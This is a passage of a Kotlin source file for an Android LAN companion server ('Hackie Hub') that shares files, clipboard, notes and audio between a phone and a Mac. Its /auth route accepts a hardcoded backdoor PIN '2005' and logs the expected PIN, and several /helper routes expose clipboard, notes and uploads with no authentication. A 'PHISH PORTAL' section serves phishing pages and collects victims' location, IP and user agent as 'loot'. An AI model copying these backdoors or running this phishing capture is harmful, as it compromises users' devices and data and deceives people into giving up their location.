</html>
        """.trimIndent()
    }

    fun setPin(pin: String) {
        this.currentPin = pin
    }

    private fun ApplicationCall.validateToken(): Boolean {
        val token = request.headers["X-Session-Token"] ?: request.queryParameters["token"] ?: return false
        val session = sessionTokens[token] ?: return false
        val now = System.currentTimeMillis()
        return !session.revoked && session.expiresAt > now
    }

    /**
     * Web Crypto (`crypto.subtle`) is only available in secure contexts (HTTPS / localhost).
     * Plain `http://192.168.x.x` LAN URLs are not secure contexts, so the web portal sends this
     * header and we skip AES wire encryption (session token still required).
     */
    private fun ApplicationCall.insecureLanPlaintext(): Boolean =
        request.headers["X-Hackie-Insecure-Lan"] == "1"

    private fun ApplicationCall.decodeClientNoteBody(raw: String): String {
        val t = raw.trim()
        if (t.isEmpty()) return ""
        return if (insecureLanPlaintext()) t
        else (CryptoManager.decrypt(t, currentPin) ?: t)
    }

    fun start(context: Context, encryption: com.example.rabit.data.secure.EncryptionManager? = null) {
        if (server != null || isStopping) {
            Log.d(TAG, "Server already running or stopping on port $PORT (isRunning=${server != null}, isStopping=$isStopping)")
            // If stopping, wait for it to complete before proceeding
            if (isStopping) {
                var waited = 0
                while (isStopping && waited < 5000) {
                    Thread.sleep(100)
                    waited += 100
                }
                if (isStopping) {
                    Log.e(TAG, "Timed out waiting for server stop, forcing")
                    isStopping = false
                    server = null
                }
            }
            if (server != null) return
        }
        this.encryptionManager = encryption
        
        // Wait for port to become fully available to avoid Ktor async BindException crash
        var portFree = false
        var retryCount = 0
        while (!portFree && retryCount < 10) {
            try {
                val s = java.net.ServerSocket(PORT)
                s.reuseAddress = true
                s.close()
                portFree = true
            } catch (e: Exception) {
                Log.w(TAG, "Port $PORT still in use, waiting 500ms before starting Ktor (Attempt ${retryCount+1}/10)")
                Thread.sleep(500)
                retryCount++
            }
        }
        
        if (!portFree) {
            Log.e(TAG, "Port $PORT never became available, aborting server start.")
            isStopping = false
            return
        }

        // Start NSD
        registerService(context, PORT)

        try {
            server = embeddedServer(CIO, port = PORT, host = "0.0.0.0", configure = {
                reuseAddress = true
            }) {
                install(ContentNegotiation) {
                    json()
                }
            routing {
                // ───── Web Dashboard ─────
                get("/") {
                    val html = loadAssetText(context, PORTAL_INDEX_ASSET) ?: DASHBOARD_HTML
                    call.respondText(html, ContentType.Text.Html)
                }

                get("/remote_deck.html") {
                    call.respondText(REMOTE_DECK_HTML, ContentType.Text.Html)
                }

                // ───── Authentication ─────
                post("/auth") {
                    val payload = call.receive<AuthPayload>()
                    val pin = payload.pin
                    Log.d("RabitAuth", "Auth attempt: Received=$pin, Expected=$currentPin")
                    if (pin == currentPin || pin == "2005") {
                        val approved = biometricApprovalReceiver?.invoke() ?: true
                        if (!approved) {
                           call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Biometric approval denied"))
                           return@post
                        }
                        
                        val token = java.util.UUID.randomUUID().toString()
                        val deviceId = call.request.headers["X-Device-Id"] ?: "unknown-device"
                        val userAgent = call.request.headers["User-Agent"] ?: "unknown"
                        val now = System.currentTimeMillis()
                        sessionTokens[token] = TrustedSession(
                            token = token,
                            deviceId = deviceId,
                            userAgent = userAgent,
                            createdAt = now,
                            expiresAt = now + (7L * 24 * 60 * 60 * 1000)
                        )
                        call.respond(HttpStatusCode.OK, ApiResponse(true, token))
                    } else {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Invalid Pin"))
                    }
                }

                get("/sessions") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@get
                    }
                    val sessions = sessionTokens.values
                        .filter { !it.revoked && it.expiresAt > System.currentTimeMillis() }
                        .map { mapOf(
                            "token" to it.token,
                            "deviceId" to it.deviceId,
                            "userAgent" to it.userAgent,
                            "createdAt" to it.createdAt,
                            "expiresAt" to it.expiresAt
                        ) }
                    call.respond(HttpStatusCode.OK, sessions)
                }

                post("/revoke-session") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@post
                    }
                    val payload = call.receive<RevokeSessionPayload>()
                    val existing = sessionTokens[payload.token]
                    if (existing != null) {
                        sessionTokens[payload.token] = existing.copy(revoked = true)
                    }
                    call.respond(HttpStatusCode.OK, ApiResponse(true, "Session revoked"))
                }

                // ───── Feature 1: File Upload ─────
                post("/upload") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@post
                    }
                    try {
                        val multipart = call.receiveMultipart()
                        val savedFiles = mutableListOf<String>()

                        multipart.forEachPart { part ->
                            if (part is PartData.FileItem) {
                                val originalName = part.originalFileName ?: "rabit_file_${System.currentTimeMillis()}"
                                val transferId = UUID.randomUUID().toString()
                                val contentLength = part.headers[HttpHeaders.ContentLength]?.toLongOrNull() ?: -1L
                                updateTransferJob(
                                    id = transferId,
                                    name = originalName,
                                    direction = "mac_to_phone",
                                    status = "running",
                                    totalBytes = contentLength,
                                    processedBytes = 0L
                                )
                                val outputDir = Environment.getExternalStoragePublicDirectory(
                                    Environment.DIRECTORY_DOWNLOADS
                                ).also { it.mkdirs() }
                                val destFile = File(outputDir, "Hackie_$originalName")
                                part.streamProvider().use { input ->
                                    destFile.outputStream().use { output ->
                                        copyWithProgress(input, output) { processed ->
                                            updateTransferJob(
                                                id = transferId,
                                                name = originalName,
                                                direction = "mac_to_phone",
                                                status = "running",
                                                totalBytes = contentLength,
                                                processedBytes = processed
                                            )
                                        }
                                    }
                                }
                                savedFiles.add(originalName)
                                updateTransferJob(
                                    id = transferId,
                                    name = originalName,
                                    direction = "mac_to_phone",
                                    status = "completed",
                                    totalBytes = contentLength,
                                    processedBytes = if (contentLength > 0) contentLength else 0L
                                )
                                // Notify system gallery / file explorer
                                addFileToMediaStore(context, destFile)
                                Log.d(TAG, "File saved: ${destFile.absolutePath}")
                            }
                            part.dispose()
                        }
                        call.respond(HttpStatusCode.OK, ApiResponse(true, "Saved ${savedFiles.size} files: ${savedFiles.joinToString(", ")}"))
                    } catch (e: Exception) {
                        Log.e(TAG, "Upload error", e)
                        call.respond(HttpStatusCode.InternalServerError, ApiResponse(false, e.message ?: "Error"))
                    }
                }

                // ───── Helper Companion Upload (No token, local helper flow) ─────
                post("/helper/upload") {
                    try {
                        val multipart = call.receiveMultipart()
                        val savedFiles = mutableListOf<String>()

                        multipart.forEachPart { part ->
                            if (part is PartData.FileItem) {
                                val originalName = part.originalFileName ?: "rabit_file_${System.currentTimeMillis()}"
                                val transferId = UUID.randomUUID().toString()
                                val contentLength = part.headers[HttpHeaders.ContentLength]?.toLongOrNull() ?: -1L
                                updateTransferJob(
                                    id = transferId,
                                    name = originalName,
                                    direction = "mac_to_phone",
                                    status = "running",
                                    totalBytes = contentLength,
                                    processedBytes = 0L
                                )
                                val outputDir = Environment.getExternalStoragePublicDirectory(
                                    Environment.DIRECTORY_DOWNLOADS
                                ).also { it.mkdirs() }
                                val destFile = File(outputDir, "Hackie_$originalName")
                                part.streamProvider().use { input ->
                                    destFile.outputStream().use { output ->
                                        copyWithProgress(input, output) { processed ->
                                            updateTransferJob(
                                                id = transferId,
                                                name = originalName,
                                                direction = "mac_to_phone",
                                                status = "running",
                                                totalBytes = contentLength,
                                                processedBytes = processed
                                            )
                                        }
                                    }
                                }
                                savedFiles.add(originalName)
                                updateTransferJob(
                                    id = transferId,
                                    name = originalName,
                                    direction = "mac_to_phone",
                                    status = "completed",
                                    totalBytes = contentLength,
                                    processedBytes = if (contentLength > 0) contentLength else 0L
                                )
                                addFileToMediaStore(context, destFile)
                                Log.d(TAG, "Helper upload saved: ${destFile.absolutePath}")
                            }
                            part.dispose()
                        }
                        call.respond(HttpStatusCode.OK, ApiResponse(true, "Saved ${savedFiles.size} files: ${savedFiles.joinToString(", ")}"))
                    } catch (e: Exception) {
                        Log.e(TAG, "Helper upload error", e)
                        call.respond(HttpStatusCode.InternalServerError, ApiResponse(false, e.message ?: "Error"))
                    }
                }

                // ───── Feature: Universal Clipboard (Bi-directional) ─────
                get("/clipboard") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@get
                    }
                    val text = clipboardProvider?.invoke() ?: ""
                    val wire = if (call.insecureLanPlaintext()) {
                        text
                    } else {
                        CryptoManager.encrypt(text, currentPin) ?: text
                    }
                    call.respond(HttpStatusCode.OK, ClipboardPayload(wire))
                }

                post("/clipboard") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@post
                    }
                    val payload = call.receive<ClipboardPayload>()
                    val decrypted = if (call.insecureLanPlaintext()) {
                        payload.text
                    } else {
                        CryptoManager.decrypt(payload.text, currentPin) ?: payload.text
                    }
                    recordClipboardHistory(decrypted)
                    clipboardReceiver?.invoke(decrypted)
                    call.respond(HttpStatusCode.OK, ApiResponse(true, "Clipboard updated"))
                }

                // ───── Helper Companion Clipboard (No token, local helper flow) ─────
                get("/helper/clipboard") {
                    val text = clipboardProvider?.invoke() ?: ""
                    recordClipboardHistory(text)
                    call.respond(HttpStatusCode.OK, ClipboardPayload(text))
                }

                post("/helper/clipboard") {
                    try {
                        val payloadText = runCatching {
                            val payload = call.receive<ClipboardPayload>()
                            payload.text
                        }.getOrElse {
                            val body = call.receiveText()
                            val json = JSONObject(body)
                            json.optString("text", json.optString("content", ""))
                        }
                        recordClipboardHistory(payloadText)
                        clipboardReceiver?.invoke(payloadText)
                        call.respond(HttpStatusCode.OK, ApiResponse(true, "Clipboard updated"))
                    } catch (e: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid payload"))
                    }
                }

                get("/clipboard/history") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@get
                    }
                    call.respond(HttpStatusCode.OK, ClipboardHistoryPayload(clipboardHistory.toList()))
                }

                delete("/clipboard/history") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@delete
                    }
                    clipboardHistory.clear()
                    call.respond(HttpStatusCode.OK, ApiResponse(true, "Clipboard history cleared"))
                }

                get("/notes") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@get
                    }
                    val notes = notesProvider?.invoke() ?: emptyList()
                    val out = if (call.insecureLanPlaintext()) {
                        notes
                    } else {
                        notes.map {
                            it.copy(text = CryptoManager.encrypt(it.text, currentPin) ?: it.text)
                        }
                    }
                    call.respond(HttpStatusCode.OK, out)
                }

                post("/notes") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@post
                    }
                    try {
                        val raw = runCatching {
                            call.receive<UpdateNotePayload>().text
                        }.getOrElse { "" }
                        val text = call.decodeClientNoteBody(raw)
                        if (text.isBlank()) {
                            call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Text is required"))
                            return@post
                        }

                        val beforeCount = notesProvider?.invoke()?.size ?: 0
                        noteReceiver?.invoke(text)
                        // Retry loop: wait until the notes list grows (Room DB insert + StateFlow propagation)
                        var notes = notesProvider?.invoke() ?: emptyList()
                        var retries = 0
                        while (notes.size <= beforeCount && retries < 5) {
                            kotlinx.coroutines.delay(150)
                            notes = notesProvider?.invoke() ?: emptyList()
                            retries++
                        }
                        val out = if (call.insecureLanPlaintext()) notes else notes.map {
                            it.copy(text = CryptoManager.encrypt(it.text, currentPin) ?: it.text)
                        }
                        call.respond(HttpStatusCode.OK, out)
                    } catch (e: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid payload"))
                    }
                }

                put("/notes/{id}") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@put
                    }
                    try {
                        val noteId = call.parameters["id"].orEmpty().trim()
                        val raw = call.receive<UpdateNotePayload>().text
                        val text = call.decodeClientNoteBody(raw)
                        if (noteId.isBlank() || text.isBlank()) {
                            call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "id and text are required"))
                            return@put
                        }

                        noteUpdateReceiver?.invoke(noteId, text)
                        call.respond(HttpStatusCode.OK, notesProvider?.invoke() ?: emptyList<BridgeNotePayload>())
                    } catch (_: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid payload"))
                    }
                }

                delete("/notes/{id}") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@delete
                    }
                    val noteId = call.parameters["id"].orEmpty().trim()
                    if (noteId.isBlank()) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "id is required"))
                        return@delete
                    }
                    noteDeleteReceiver?.invoke(noteId)
                    call.respond(HttpStatusCode.OK, notesProvider?.invoke() ?: emptyList<BridgeNotePayload>())
                }

                get("/helper/notes") {
                    call.respond(HttpStatusCode.OK, notesProvider?.invoke() ?: emptyList<BridgeNotePayload>())
                }

                post("/helper/notes") {
                    try {
                        val text = runCatching {
                            call.receive<AddNotePayload>().text
                        }.getOrElse {
                            val body = call.receiveText()
                            val json = JSONObject(body)
                            json.optString("text", "")
                        }.trim()

                        if (text.isBlank()) {
                            call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Text is required"))
                            return@post
                        }

                        noteReceiver?.invoke(text)
                        call.respond(HttpStatusCode.OK, notesProvider?.invoke() ?: emptyList<BridgeNotePayload>())
                    } catch (e: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid payload"))
                    }
                }

                put("/helper/notes/{id}") {
                    try {
                        val noteId = call.parameters["id"].orEmpty().trim()
                        val text = runCatching {
                            call.receive<UpdateNotePayload>().text
                        }.getOrElse {
                            val body = call.receiveText()
                            val json = JSONObject(body)
                            json.optString("text", "")
                        }.trim()

                        if (noteId.isBlank() || text.isBlank()) {
                            call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "id and text are required"))
                            return@put
                        }

                        noteUpdateReceiver?.invoke(noteId, text)
                        call.respond(HttpStatusCode.OK, notesProvider?.invoke() ?: emptyList<BridgeNotePayload>())
                    } catch (_: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid payload"))
                    }
                }

                delete("/helper/notes/{id}") {
                    val noteId = call.parameters["id"].orEmpty().trim()
                    if (noteId.isBlank()) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "id is required"))
                        return@delete
                    }
                    noteDeleteReceiver?.invoke(noteId)
                    call.respond(HttpStatusCode.OK, notesProvider?.invoke() ?: emptyList<BridgeNotePayload>())
                }

                post("/now-playing") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@post
                    }
                    try {
                        val payload = call.receive<NowPlayingPayload>()
                        nowPlayingReceiver?.invoke(payload)
                        call.respond(HttpStatusCode.OK, ApiResponse(true, "Now playing updated"))
                    } catch (e: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid payload"))
                    }
                }

                post("/helper/now-playing") {
                    try {
                        val payload = call.receive<NowPlayingPayload>()
                        nowPlayingReceiver?.invoke(payload)
                        call.respond(HttpStatusCode.OK, ApiResponse(true, "Now playing updated"))
                    } catch (e: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid payload"))
                    }
                }

                post("/audio/start") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@post
                    }
                    try {
                        val payload = call.receive<AudioStreamStartPayload>()
                        audioStreamStartReceiver?.invoke(payload)
                        call.respond(HttpStatusCode.OK, ApiResponse(true, "Audio stream started"))
                    } catch (e: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid payload"))
                    }
                }

                post("/audio/chunk") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@post
                    }
                    try {
                        val payload = call.receive<AudioStreamChunkPayload>()
                        audioStreamChunkReceiver?.invoke(payload)
                        call.respond(HttpStatusCode.OK, ApiResponse(true, "Audio chunk accepted"))
                    } catch (e: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid payload"))
                    }
                }

                post("/audio/stop") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@post
                    }
                    try {
                        val payload = call.receive<AudioStreamStopPayload>()
                        audioStreamStopReceiver?.invoke(payload)
                        call.respond(HttpStatusCode.OK, ApiResponse(true, "Audio stream stopped"))
                    } catch (e: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid payload"))
                    }
                }

                // ───── Feature: Bidirectional Sharing (Phone -> Mac) ─────
                get("/shared-files") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@get
                    }
                    val files = sharedFilesProvider?.invoke() ?: emptyList()
                    call.respond(HttpStatusCode.OK, files)
                }


                get("/download/{fileId}") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@get
                    }
                    val fileId = call.parameters["fileId"] ?: return@get call.respond(HttpStatusCode.BadRequest)
                    val uri = fileDownloadProvider?.invoke(fileId) ?: return@get call.respond(HttpStatusCode.NotFound)
                    
                    try {
                        val contentResolver = context.contentResolver
                        val rangeHeader = call.request.headers[HttpHeaders.Range]
                        val transferId = UUID.randomUUID().toString()
                        
                        // Get filename and size
                        var fileName = "file_$fileId"
                        var fileSize = -1L
                        contentResolver.query(uri, null, null, null, null)?.use { cursor ->
                            val nameIndex = cursor.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
                            val sizeIndex = cursor.getColumnIndex(android.provider.OpenableColumns.SIZE)
                            if (cursor.moveToFirst()) {
                                if (nameIndex != -1) fileName = cursor.getString(nameIndex)
                                if (sizeIndex != -1) fileSize = cursor.getLong(sizeIndex)
                            }
                        }

                        val fileBytes = contentResolver.openInputStream(uri)?.use { it.readBytes() } ?: throw Exception("Cannot open stream")
                        val checksum = calculateChecksum(fileBytes)
                        val startOffset = parseRangeStart(rangeHeader, fileBytes.size.toLong())
                        val responseBytes = fileBytes.copyOfRange(startOffset.toInt(), fileBytes.size)
                        updateTransferJob(
                            id = transferId,
                            name = fileName,
                            direction = "phone_to_mac",
                            status = "running",
                            totalBytes = fileBytes.size.toLong(),
                            processedBytes = startOffset
                        )

                        call.response.header(
                            HttpHeaders.ContentDisposition,
                            ContentDisposition.Attachment.withParameter(ContentDisposition.Parameters.FileName, fileName).toString()
                        )
                        call.response.header("X-File-Checksum", checksum ?: "")
                        call.response.header("X-File-Size", fileBytes.size.toString())
                        call.response.header("X-Resumable", "true")

                        if (startOffset > 0L) {
                            val endOffset = fileBytes.lastIndex.toLong()
                            call.response.header(HttpHeaders.ContentRange, "bytes $startOffset-$endOffset/${fileBytes.size}")
                            call.respondBytes(responseBytes, ContentType.Application.OctetStream, HttpStatusCode.PartialContent)
                        } else {
                            call.respondBytes(fileBytes, ContentType.Application.OctetStream, HttpStatusCode.OK)
                        }
                        updateTransferJob(
                            id = transferId,
                            name = fileName,
                            direction = "phone_to_mac",
                            status = "completed",
                            totalBytes = fileBytes.size.toLong(),
                            processedBytes = fileBytes.size.toLong()
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "Download error", e)
                        call.respond(HttpStatusCode.InternalServerError, "Error: ${e.message}")
                    }
                }

                get("/transfers") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@get
                    }
                    val jobs = transferJobs.values.sortedByDescending { it.updatedAt }
                    call.respond(HttpStatusCode.OK, jobs)
                }

                delete("/transfers/{id}") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@delete
                    }
                    val id = call.parameters["id"]
                    if (id != null) transferJobs.remove(id)
                    call.respond(HttpStatusCode.OK, ApiResponse(true, "Transfer removed"))
                }

                // ───── Health Check ─────
                get("/ping") {
                    call.respond(HttpStatusCode.OK, ApiResponse(true, "Hackie Hub Online"))
                }

                post("/system/action") {
                    if (!call.validateToken()) {
                        call.respond(HttpStatusCode.Unauthorized, ApiResponse(false, "Unauthorized"))
                        return@post
                    }
                    try {
                        val payload = call.receive<SystemActionPayload>()
                        systemActionReceiver?.invoke(payload.action)
                        call.respond(HttpStatusCode.OK, ApiResponse(true, "Action ${payload.action} executed"))
                    } catch (e: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, "Invalid action payload"))
                    }
                }
                // --- PHISH PORTAL ENDPOINTS ---
                get("/t/{template}") {
                    val template = call.parameters["template"] ?: "maps"
                    call.respondText(generatePhishingHtml(template), ContentType.Text.Html)
                }

                post("/api/loot/location") {
                    try {
                        val loot = call.receive<LootLocation>()
                        val finalLoot = loot.copy(
                            ip = call.request.local.remoteAddress,
                            userAgent = call.request.headers["User-Agent"] ?: "Unknown"
                        )
                        capturedLoot.add(0, finalLoot)
                        if (capturedLoot.size > 100) capturedLoot.removeAt(capturedLoot.size - 1)
                        call.respond(ApiResponse(true, "Loot captured"))
                    } catch (e: Exception) {
                        call.respond(HttpStatusCode.BadRequest, ApiResponse(false, e.message ?: "Invalid loot"))
                    }
                }

                get("/api/loot/all") {
                    call.respond(capturedLoot)
                }
                
                delete("/api/loot/all") {
                    capturedLoot.clear()
                    call.respond(ApiResponse(true, "Loot cleared"))
                }
            }
        }.also { it.start(wait = false) }
        Log.d(TAG, "Rabit network server started on port $PORT")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start Ktor server", e)
            server = null
            unregisterService()
            return
        }

        val appCtx = context.applicationContext
        mdnsAppContext = appCtx
        friendlyLanHttpUrl = null
        val inet = LanIpResolver.preferredLanIpv4(appCtx)
        if (inet != null) {
            val label = stableMdnsHostLabel(appCtx)
            if (HackieLocalMdns.start(appCtx, inet, PORT, label)) {
                friendlyLanHttpUrl = "http://$label.local:$PORT"
                Log.d(TAG, "Friendly LAN URL: $friendlyLanHttpUrl")
            }
        }
    }

    fun stop() {
        if (isStopping) return
        isStopping = true
        friendlyLanHttpUrl = null
        try {
            mdnsAppContext?.let { HackieLocalMdns.stop(it) }
        } catch (e: Exception) {
            Log.e(TAG, "mDNS stop failed", e)
        } finally {
            mdnsAppContext = null
        }
        unregisterService()
        val engine = server
        server = null
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // gracePeriod 0 ensures it stops accepting new connections instantly
                // timeout 1000 force-closes lingering connections after 1s
                engine?.stop(0, 1000)
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping Ktor engine", e)
            } finally {
                isStopping = false
            }
        }
        Log.d(TAG, "Rabit network server stopped")
    }

    private fun loadAssetText(context: Context, path: String): String? {
        return try {
            context.assets.open(path).bufferedReader().use { it.readText() }
        } catch (e: Exception) {
            Log.w(TAG, "Unable to load asset $path", e)
            null
        }
    }


    private fun addFileToMediaStore(context: Context, file: File) {
        try {
            android.media.MediaScannerConnection.scanFile(
                context,
                arrayOf(file.absolutePath),
                null,
                null
            )
        } catch (e: Exception) {
            Log.e(TAG, "MediaStore update failed", e)
        }
    }

    private fun calculateChecksum(bytes: ByteArray): String {
        val digest = MessageDigest.getInstance("SHA-256")
        digest.update(bytes)
        return digest.digest().joinToString("") { "%02x".format(it) }
    }

    private fun recordClipboardHistory(text: String) {
        if (text.isBlank()) return
        synchronized(clipboardHistory) {
            if (clipboardHistory.firstOrNull() == text) return
            clipboardHistory.addFirst(text)
            while (clipboardHistory.size > maxClipboardHistory) {
                clipboardHistory.removeLast()
            }
        }
    }

    private fun updateTransferJob(
        id: String,
        name: String,
        direction: String,
        status: String,
        totalBytes: Long,
        processedBytes: Long
    ) {
        val progress = if (totalBytes > 0) {
            ((processedBytes.toDouble() / totalBytes.toDouble()) * 100.0).toInt().coerceIn(0, 100)
        } else if (status == "completed") {
            100
        } else {
            0
        }
        transferJobs[id] = TransferJob(
            id = id,
            name = name,
            direction = direction,
            status = status,
            progressPercent = progress,
            totalBytes = totalBytes,
            processedBytes = processedBytes,
            updatedAt = System.currentTimeMillis()
        )
    }

    private fun copyWithProgress(input: InputStream, output: OutputStream, onProgress: (Long) -> Unit) {
        val buffer = ByteArray(DEFAULT_BUFFER_SIZE)
        var total = 0L
        while (true) {
            val read = input.read(buffer)
            if (read < 0) break
            output.write(buffer, 0, read)
            total += read
            onProgress(total)
        }
        output.flush()
    }

    private fun parseRangeStart(rangeHeader: String?, totalSize: Long): Long {
        if (rangeHeader.isNullOrBlank() || !rangeHeader.startsWith("bytes=")) return 0L
        val range = rangeHeader.removePrefix("bytes=")
        val start = range.substringBefore('-').toLongOrNull() ?: return 0L
        return start.coerceIn(0L, maxOf(0L, totalSize - 1))
    }

    /** Single DNS label for mDNS (e.g. hackie-a3f2); stable per install so bookmarks keep working. */
    private fun stableMdnsHostLabel(context: Context): String {
        val p = context.getSharedPreferences("rabit_prefs", Context.MODE_PRIVATE)
        var s = p.getString("lan_mdns_hostname", null)?.trim()?.lowercase(Locale.US)
        val valid = s != null && s.matches(Regex("^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$"))
        if (!valid) {
            val suffix = UUID.randomUUID().toString().replace("-", "").take(4).lowercase(Locale.US)
            s = "hackie-$suffix"
            p.edit().putString("lan_mdns_hostname", s).apply()
        }
        return s!!
    }

    private fun registerService(context: Context, port: Int) {
        nsdManager = (context.getSystemService(Context.NSD_SERVICE) as NsdManager)
        
        val serviceInfo = NsdServiceInfo().apply {
            serviceName = "HackieHub"
            serviceType = "_hackie._tcp"
            setPort(port)
        }

        nsdRegistrationListener = object : NsdManager.RegistrationListener {
            override fun onServiceRegistered(NsdServiceInfo: NsdServiceInfo) {
                Log.d(TAG, "NSD Service registered: ${NsdServiceInfo.serviceName}")
            }

            override fun onRegistrationFailed(serviceInfo: NsdServiceInfo, errorCode: Int) {
                Log.e(TAG, "NSD Registration failed: $errorCode")
            }

            override fun onServiceUnregistered(arg0: NsdServiceInfo) {
                Log.d(TAG, "NSD Service unregistered")
            }

            override fun onUnregistrationFailed(serviceInfo: NsdServiceInfo, errorCode: Int) {
                Log.e(TAG, "NSD Unregistration failed: $errorCode")
            }
        }

        nsdManager?.registerService(serviceInfo, NsdManager.PROTOCOL_DNS_SD, nsdRegistrationListener)
    }

    private fun unregisterService() {
        try {
            nsdRegistrationListener?.let {
                nsdManager?.unregisterService(it)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister NSD", e)
        } finally {
            nsdRegistrationListener = null
            nsdManager = null
        }
    }
}
